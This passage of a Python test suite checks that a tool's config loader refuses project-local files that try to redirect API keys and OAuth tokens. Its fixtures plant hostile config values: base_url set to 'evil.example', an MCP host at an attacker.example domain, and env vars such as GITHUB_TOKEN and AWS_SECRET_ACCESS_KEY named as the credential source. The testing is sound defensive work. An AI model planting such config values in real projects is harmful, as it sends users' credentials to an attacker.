        "enabled = true\n"
        'provider = "openai"\n'
        'api_key_env = "PROJECT_KEY"\n'
    )))

    client = build_llm(load_kb_config().llm)

    assert client is None, _leak(client)


def test_a_discovered_file_may_not_switch_the_provider_the_privileged_key_is_sent_to(
        tmp_path, monkeypatch, egress_env):
    """The provenance key is the provider that WON the merge, not "did any
    privileged file set one".

    The merge is last-wins and `provider` is ungated for every non-cli value, so a
    discovered file can win `provider` while the privileged file's api_key_env
    survives untouched. Measured before this fix: an AnthropicLlm at
    api.anthropic.com whose x-api-key header held the user's OpenAI PROJECT_KEY.

    The discovered file sets `provider` and NOTHING ELSE, which is the property the
    name states. It used to carry a `base_url` line too, and that line was doing all
    the work: delete it and the provider switch went through, because the tier-off
    fired only when an egress key had also been refused. The switch is the whole
    claim, so the fixture may not carry a second refusable key."""
    _privileged_global(monkeypatch, tmp_path, (
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'api_key_env = "PROJECT_KEY"\n'
    ))
    monkeypatch.chdir(_plant_local(tmp_path, text='[llm]\nprovider = "anthropic"\n'))

    client = build_llm(load_kb_config().llm)

    assert client is None, _leak(client)


def test_a_privileged_provider_still_builds_when_a_discovered_api_key_env_is_refused(
        tmp_path, monkeypatch, egress_env):
    """SHAPE GUARD, not a revert detector: this passes before and after the fix.

    It pins the rule that keeps the refusal from being a denial of service on the
    common honest config. Most people never write api_key_env -- relying on the
    per-provider default is how `provider = "openai"` is normally written -- so a
    refused narrowing of a key the user never set changes nothing about what the
    request carries, and the tier must keep working. Keying the refusal on the
    privileged file having its own api_key_env, or on the refused key alone,
    turns this row off."""
    _privileged_global(monkeypatch, tmp_path, '[llm]\nenabled = true\nprovider = "openai"\n')
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        'api_key_env = "AWS_SECRET_ACCESS_KEY"\n'
    )))

    client = build_llm(load_kb_config().llm)

    assert type(client).__name__ == "OpenAILlm"
    assert client.api_key_env == "OPENAI_API_KEY"
    assert client._headers()["Authorization"] == "Bearer sk-org-broad-sentinel"


def test_a_privileged_api_key_env_survives_a_planted_base_url(
        tmp_path, monkeypatch, egress_env):
    """SHAPE GUARD, the second anti-denial-of-service row. The privileged file
    named both the provider and its credential, so a planted base_url is refused
    and the tier keeps running on the values the user chose."""
    _privileged_global(monkeypatch, tmp_path, (
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'api_key_env = "PROJECT_KEY"\n'
    ))
    monkeypatch.chdir(_plant_local(tmp_path, text='[llm]\nbase_url = "https://evil.example"\n'))

    client = build_llm(load_kb_config().llm)

    assert client.api_key_env == "PROJECT_KEY"
    assert client.base_url == "https://api.openai.com/v1"
    assert client._headers()["Authorization"] == "Bearer sk-scoped-project-sentinel"


def test_builtin_and_ollama_tiers_are_untouched_by_the_refusal(
        tmp_path, monkeypatch, egress_env):
    """The refusal is scoped to the providers that send a credential. Widening it
    to every provider would break honest directory-scoped config, which is the
    feature the whole module exists to keep working."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[embeddings]\n"
        "enabled = true\n"
        'provider = "ollama"\n'
        'base_url = "http://127.0.0.1:11435"\n'
    )))

    embedder = build_embedder(load_kb_config().embeddings)

    assert type(embedder).__name__ == "OllamaEmbedder"
    assert embedder.base_url == "http://127.0.0.1:11434"


def test_a_builtin_tier_with_a_stray_base_url_still_builds(
        tmp_path, monkeypatch, egress_env):
    """The second row of the same guard: builtin sends no credential anywhere, so
    a refused base_url leaves it exactly where it was."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[embeddings]\n"
        "enabled = true\n"
        'provider = "builtin"\n'
        'base_url = "https://evil.example"\n'
    )))

    assert type(build_embedder(load_kb_config().embeddings)).__name__ == "BuiltinEmbedder"


def test_the_review_client_is_off_too_when_the_llm_tier_is_refused(
        tmp_path, monkeypatch, egress_env):
    """The council reviewer is the second producer of a credentialed client from
    the same LlmCfg. It needs no gate of its own: `enabled = False` is the carrier,
    build_review_llm's model_copy carries it, and build_llm returns None on it."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'review_provider = "openai"\n'
        'base_url = "https://evil.example"\n'
    )))

    cfg = load_kb_config()

    review = build_review_llm(cfg.llm, build_llm(cfg.llm))

    assert review is None, _leak(review)


def test_the_same_file_named_with_config_builds_the_client_it_asked_for(
        tmp_path, monkeypatch, egress_env):
    """The control that makes this a provenance decision and not a content one.

    Byte-for-byte the payload of the LM Studio test, passed as `--config`. The
    loopback endpoint and the narrow key are honoured, because naming the file is
    the explicit act the gate asks for."""
    _no_global(monkeypatch, tmp_path)
    named = tmp_path / "mine.toml"
    named.write_text(LM_STUDIO + 'api_key_env = "PROJECT_KEY"\n')
    monkeypatch.chdir(tmp_path)

    client = build_llm(load_kb_config(str(named)).llm)

    assert type(client).__name__ == "OpenAILlm"
    assert client.base_url == "http://127.0.0.1:1234/v1"
    assert client.api_key_env == "PROJECT_KEY"


def test_the_llm_flag_re_enables_a_refused_tier(tmp_path, monkeypatch, egress_env):
    """`--llm PROVIDER` is the same explicit act as `--config`, and it clears the
    refusal for free: apply_llm_overrides already sets `cfg.llm.enabled = True`.
    Pinned so a later edit to that function cannot quietly remove the escape
    hatch."""
    from contextlake.kb.config import apply_llm_overrides

    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'base_url = "https://evil.example"\n'
    )))

    cfg = load_kb_config()
    assert build_llm(cfg.llm) is None
    apply_llm_overrides(cfg, provider="openai")

    assert build_llm(cfg.llm) is not None


def test_a_planted_enabled_true_cannot_survive_the_refusal(
        tmp_path, monkeypatch, egress_env):
    """`enabled = False` is written into the merged dict AFTER the merge loop, so
    a planted `enabled = true` in the same file cannot win it back. Written inside
    the loop, the local tier is last-wins over it."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'api_key_env = "GITHUB_TOKEN"\n'
    )))

    cfg = load_kb_config()

    assert cfg.llm.enabled is False
    assert build_llm(cfg.llm) is None


def test_a_refused_cli_provider_leaves_the_privileged_provider_winning(
        tmp_path, monkeypatch, egress_env):
    """Provenance is read AFTER the drop, so a provider that was refused is not
    counted as the one that won. Read from the raw dict instead, the dropped
    `provider = "cli"` looks like a discovered win and turns an honest privileged
    tier off."""
    _privileged_global(monkeypatch, tmp_path, (
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
        'api_key_env = "PROJECT_KEY"\n'
    ))
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        "[llm]\n"
        'provider = "cli"\n'
        'base_url = "https://evil.example"\n'
    )))

    client = build_llm(load_kb_config().llm)

    assert type(client).__name__ == "OpenAILlm"
    assert client.api_key_env == "PROJECT_KEY"


def test_the_tier_off_refusal_says_what_to_do_without_naming_the_refused_file(
        tmp_path, monkeypatch, egress_env, gls_logs):
    """The warning is the only thing separating "contextlake refused this" from
    "you turned it off", so its wording is part of the fix. It must not say
    `set enabled = true`: that key is in the file whose keys were refused, and
    setting it there does nothing."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=LM_STUDIO))
    # Module-level latch keyed on (path, key); this message keys on the table
    # alone, so it fires once per PROCESS and the assertion is order-dependent
    # without this line.
    kbcfg._WARNED_UNTRUSTED.clear()
    gls_logs.set_level(logging.WARNING)

    load_kb_config()

    text = "\n".join(r.getMessage() for r in gls_logs.records
                     if r.levelno >= logging.WARNING)
    assert "[llm] is off for this run" in text
    assert "--config PATH" in text
    assert "enabled = true" not in text
    assert "127.0.0.1:1234" not in text   # attacker-controlled text, never echoed


def _doctor_lines(tmp_path, monkeypatch, planted: str) -> list[str]:
    """Run `contextlake doctor` against a planted discovered config and return the
    lines it printed.

    `report_line` is the single producer of every doctor line (`_say` wraps it), so
    collecting there is doctor's whole output and the result does not depend on
    capsys ordering or on `readouterr` having been called first.

    The planted file sets `[kb] store_dir` into tmp_path. doctor creates the store
    directory and opens index.sqlite in it, so without that line the test would run
    against whatever store this machine has configured.
    """
    from contextlake.kb.cmds import doctor as doctormod

    store = tmp_path / "store"
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        f'[kb]\nstore_dir = "{store.as_posix()}"\n' + planted)))
    lines: list[str] = []
    monkeypatch.setattr(doctormod, "report_line", lines.append)

    doctormod.cmd_doctor(types.SimpleNamespace(config=None, fix=None))

    return lines


def test_doctor_says_the_llm_tier_was_refused_rather_than_not_enabled(
        tmp_path, monkeypatch, egress_env):
    """`refused_tiers` exists so a surface can tell a refused tier from one the user
    switched off; doctor is that surface, and it had no reader for the field.

    Both states are the same `enabled = False` in the merged config, so doctor
    printed "not enabled in config (set [llm] enabled = true, or pass
    --llm PROVIDER)" for a REFUSED tier. That advice does nothing: `enabled` lives
    in the file whose provider was refused, so setting it there re-fires the
    refusal on the next load.

    Asserted on the printed line. The same claim asserted on `cfg.refused_tiers`
    passes with the doctor branch absent, which is how the branch came to be
    missing while a test was named for it."""
    lines = _doctor_lines(tmp_path, monkeypatch, planted=(
        "[embeddings]\n"
        "enabled = false\n"
        "[llm]\n"
        "enabled = true\n"
        'provider = "openai"\n'
    ))

    line = next(ln for ln in lines if "wiki LLM" in ln)
    assert "refused" in line, line
    assert "not enabled in config" not in line, line
    # Both remedies, because only these two clear it (see doctor._refused_tier_detail).
    assert "--config PATH" in line and kbcfg.GLOBAL_CONFIG in line, line


def test_doctor_says_the_embeddings_tier_was_refused_rather_than_disabled(
        tmp_path, monkeypatch, egress_env):
    """The [embeddings] twin, which printed the barer word "disabled" for the same
    two states. `bootstrap` runs `kb embed`, so this is the tier a user hits without
    asking for it."""
    lines = _doctor_lines(tmp_path, monkeypatch, planted=(
        "[embeddings]\n"
        "enabled = true\n"
        'provider = "openai"\n'
    ))

    line = next(ln for ln in lines if "embeddings" in ln)
    assert "refused" in line, line
    assert "disabled" not in line, line


def test_the_refusal_field_is_not_settable_from_toml(tmp_path, monkeypatch, egress_env):
    """A file the gate refuses must not be able to clear its own refusal record.
    KbConfig is built from explicit kwargs, nothing splats `**kb`, and _KB_KEYS
    warns on an unknown [kb] key."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=LM_STUDIO))

    cfg = load_kb_config()

    assert cfg.refused_tiers == ("llm",)
    assert "refused_tiers" not in kbcfg._KB_KEYS


# --- the EmbeddingsCfg loopback literal (M1's root cause) --------------------
#
# Gate-independent: it reproduces on a PRIVILEGED config with no attacker in the
# story. `base_url` was a declared str default, so one literal won for every
# provider and `getattr(cfg, "base_url", <vendor default>)` never reached its
# third argument.

def test_an_openai_embedder_from_a_privileged_config_does_not_post_to_the_ollama_port(
        tmp_path, monkeypatch, egress_env):
    """provider = "openai" with no base_url line built an OpenAIEmbedder aimed at
    http://127.0.0.1:11434 with `Authorization: Bearer <OPENAI_API_KEY>`, so the
    org key went to whatever process was listening on the local Ollama port."""
    named = tmp_path / "mine.toml"
    named.write_text('[embeddings]\nenabled = true\nprovider = "openai"\n')
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(tmp_path)

    embedder = build_embedder(load_kb_config(str(named)).embeddings)

    assert embedder.base_url == "https://api.openai.com/v1"


def test_auto_still_probes_the_local_ollama_when_base_url_is_unset(
        tmp_path, monkeypatch, egress_env):
    """The silent-failure guard for the same change, on the default every install
    starts with.

    `_resolve_auto_embedder` reads cfg.base_url directly. Handed None,
    `ollama_reachable` swallows the AttributeError and returns False, so
    provider = "auto" becomes "never Ollama" with no error at all.

    All three urls the auto path uses are recorded and asserted as VALUES: both
    probes and the embedder it finally constructs. OllamaEmbedder is stubbed
    because the real one raises on a None base_url, and an AttributeError would
    say nothing about which of the three sites was handed it."""
    named = tmp_path / "mine.toml"
    named.write_text('[embeddings]\nenabled = true\nprovider = "auto"\n')
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(tmp_path)
    seen = []
    embmod = __import__("contextlake.kb.embeddings.base", fromlist=["base"])
    ollmod = __import__("contextlake.kb.embeddings.ollama", fromlist=["ollama"])
    monkeypatch.setattr(embmod, "ollama_reachable",
                        lambda url, **kw: seen.append(("reachable", url)) or True)
    monkeypatch.setattr(embmod, "ollama_has_model",
                        lambda url, model, **kw: seen.append(("has_model", url)) or True)
    monkeypatch.setattr(ollmod, "OllamaEmbedder",
                        lambda **kw: seen.append(("built", kw["base_url"])) or "stub")

    built = build_embedder(load_kb_config(str(named)).embeddings)

    assert built == "stub", "the auto path never reached Ollama, so this proves nothing"
    assert seen == [("reachable", "http://127.0.0.1:11434"),
                    ("has_model", "http://127.0.0.1:11434"),
                    ("built", "http://127.0.0.1:11434")]


def test_an_ollama_embedder_with_no_base_url_still_builds(
        tmp_path, monkeypatch, egress_env):
    """The third read site. Paired with the auto test above, which fails on a
    value: this one fails with `AttributeError: 'NoneType' object has no attribute
    'rstrip'` inside OllamaEmbedder, and an exception alone would not tell the two
    apart."""
    named = tmp_path / "mine.toml"
    named.write_text('[embeddings]\nenabled = true\nprovider = "ollama"\n')
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(tmp_path)

    embedder = build_embedder(load_kb_config(str(named)).embeddings)

    assert embedder.base_url == "http://127.0.0.1:11434"


# --- the [[sources]] keys ----------------------------------------------------
#
# The same three capabilities the scalar tables gate, on the third table:
# the env var holding a token, the host it is sent to, and the directory the
# OAuth refresh token is written into. `scopes` is strengthen-only. `url` stays
# ungated on purpose -- see trust.py.

HOSTILE_SOURCE = (
    '[[sources]]\n'
    'type = "atlassian"\n'
    'name = "planted"\n'
    'mcp = "https://mcp.attacker.example.invalid/v1/mcp"\n'
    'auth_dir = "/tmp/planted-token-store"\n'
    'token_env = "GITHUB_TOKEN"\n'
)


def test_a_discovered_source_may_not_name_the_env_var_holding_its_token(
        tmp_path, monkeypatch, egress_env):
    """sources/api.py `_headers` and sources/graphql.py `_fetch` read
    os.environ.get(token_env) into an `Authorization: Bearer` header on the request
    they make, so a discovered entry naming both the variable and the host it goes
    to is the pair EGRESS_KEYS already closed for [llm]/[embeddings].

    Asserted on the built source as well as the config, because dropping the key is
    only half the claim: trust.py states that refusing it degrades an honest
    api/graphql source to unauthenticated rather than crashing it, and that half is
    a property of the consumer."""
    from contextlake.kb.sources.base import build_source

    monkeypatch.setenv("GITHUB_TOKEN", "ghp-sentinel")
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        HOSTILE_SOURCE.replace('type = "atlassian"', 'type = "api"')
        + 'url = "https://tracker.example.com/issues.json"\n'
    )))

    src = load_kb_config().sources[0]

    assert "token_env" not in (src.model_extra or {})
    built = build_source("api", **(src.model_extra or {}))
    assert built.token_env is None
    assert "Authorization" not in built._headers()


def test_a_discovered_source_may_not_choose_the_mcp_host(
        tmp_path, monkeypatch, egress_env):
    """`mcp` is the mcp_url the `npx mcp-remote` OAuth bridge is pointed at
    (connectors/orchestrate.py), so this is base_url under another name. It is a
    different key from `url`, which stays ungated."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=HOSTILE_SOURCE))

    src = load_kb_config().sources[0]

    assert src.mcp is None


def test_a_discovered_source_may_not_choose_the_oauth_token_directory(
        tmp_path, monkeypatch, egress_env):
    """`auth_dir` becomes MCP_REMOTE_CONFIG_DIR, the directory mcp-remote writes
    the OAuth refresh token into. An honest endpoint and honest scopes still hand
    a refreshable grant to a path the file chose."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=HOSTILE_SOURCE))

    src = load_kb_config().sources[0]

    assert "auth_dir" not in (src.model_extra or {})


def test_a_discovered_source_may_narrow_the_oauth_scope_but_not_widen_it(
        tmp_path, monkeypatch, egress_env):
    """Strengthen-only, the shape `[kb] anonymize` already uses. Both directions
    are asserted: without the narrowing row, "drop scopes unconditionally" passes."""
    from contextlake.kb.connectors.atlassian import DEFAULT_SCOPES

    narrow = "read:jira-work offline_access"
    assert set(narrow.split()) < set(DEFAULT_SCOPES.split())
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        '[[sources]]\n'
        'type = "atlassian"\n'
        'name = "narrowed"\n'
        f'scopes = "{narrow}"\n'
        '[[sources]]\n'
        'type = "atlassian"\n'
        'name = "widened"\n'
        'scopes = "read:jira-work write:jira-work offline_access"\n'
    )))

    narrowed, widened = load_kb_config().sources

    assert (narrowed.model_extra or {}).get("scopes") == narrow
    assert "scopes" not in (widened.model_extra or {})


def test_an_honest_directory_scoped_web_source_still_works(
        tmp_path, monkeypatch, egress_env):
    """The standing rule this gate must not break: `[[sources]] url` is NOT gated.
    Ordinary project-local web sources are the feature; the compensating control
    is the fetchers' http/https scheme allowlist, not a provenance gate."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        '[[sources]]\n'
        'type = "api"\n'
        'name = "team-tracker"\n'
        'url = "https://tracker.example.com/issues.json"\n'
        'items = "results"\n'
    )))

    from contextlake.kb.sources.base import build_source

    src = load_kb_config().sources[0]

    assert src.name == "team-tracker"
    assert (src.model_extra or {})["url"] == "https://tracker.example.com/issues.json"
    assert (src.model_extra or {})["items"] == "results"
    # End to end: the entry that survives the gate still builds a working source
    # aimed where the project-local file said, which is the feature the whole
    # module exists to keep.
    built = build_source(src.type, **(src.model_extra or {}))
    assert built.url == "https://tracker.example.com/issues.json"
    assert built.items == "results"


def test_the_source_refusals_do_not_all_claim_the_key_runs_a_program(
        tmp_path, monkeypatch, egress_env, gls_logs):
    """Three of the six gated source keys run nothing, and the generic sentence
    would send the reader hunting an exec that is not there -- the same defect
    `_warn_untrusted_egress` exists to fix on the scalar tables."""
    _no_global(monkeypatch, tmp_path)
    monkeypatch.chdir(_plant_local(tmp_path, text=(
        HOSTILE_SOURCE + 'scopes = "read:jira-work write:jira-work"\n')))
    kbcfg._WARNED_UNTRUSTED.clear()
    gls_logs.set_level(logging.WARNING)

    load_kb_config()

    lines = [r.getMessage() for r in gls_logs.records if r.levelno >= logging.WARNING]
    said = {key: next(m for m in lines if f"[[sources]] {key}" in m)
            for key in ("token_env", "mcp", "auth_dir", "scopes")}
    assert "which environment variable holds the API key" in said["token_env"]
    assert "where requests are sent" in said["mcp"]
    assert "OAuth refresh token is written to" in said["auth_dir"]
    assert "not widen it" in said["scopes"]
    assert not any("run a program" in m for m in said.values())
    # Attacker-controlled text, never echoed back into a log line.
    assert not any("attacker.example.invalid" in m for m in lines)
